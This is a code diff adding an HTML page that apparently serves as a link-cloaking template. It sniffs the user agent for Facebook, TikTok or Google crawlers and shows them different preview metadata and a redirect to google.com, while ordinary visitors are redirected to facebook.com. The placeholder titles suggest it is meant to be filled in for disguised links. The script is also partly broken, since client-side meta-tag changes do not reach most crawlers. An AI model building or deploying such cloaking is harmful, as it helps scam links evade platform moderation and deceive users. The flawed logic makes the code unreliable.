@@ -1,1 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta property="og:title" content="Your Real User Title">
+    <meta property="og:description" content="Your Real User Description">
+    <!-- Real User Image and Link -->
+    <meta property="og:image" content="https://facebook.com/facebook-logo.png">
+    <meta property="og:url" content="https://facebook.com">
+    
+    <style>
+        #loading {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 1000;
+        }
+    </style>
 
+    <script type="text/javascript">
+        document.addEventListener("DOMContentLoaded", function() {
+            var loadingDiv = document.getElementById('loading');
+            var userAgent = navigator.userAgent.toLowerCase();
+            var crawlerPatterns = ['facebook', 'tiktok', 'google'];
+            
+            var isCrawler = crawlerPatterns.some(function(pattern) {
+                return userAgent.indexOf(pattern) !== -1;
+            });
+
+            if (isCrawler) {
+                // Crawler-specific Image and Link (Google)
+                document.querySelector('meta[property="og:image"]').setAttribute('content', 'https://www.google.com/images/logo.png');
+                document.querySelector('meta[property="og:url"]').setAttribute('content', 'https://www.google.com');
+                window.location.href = "https://www.google.com";
+            } else {
+                window.location.href = "https://facebook.com";
+            }
+
+            window.onload = function() {
+                loadingDiv.style.display = 'none';
+            };
+        });
+    </script>
+</head>
+<body>
+    <div id="loading">
+        <img src="https://yourloadingimage.com/loader.jpg" alt="Loading..." />
+    </div>
+</body>
+</html>
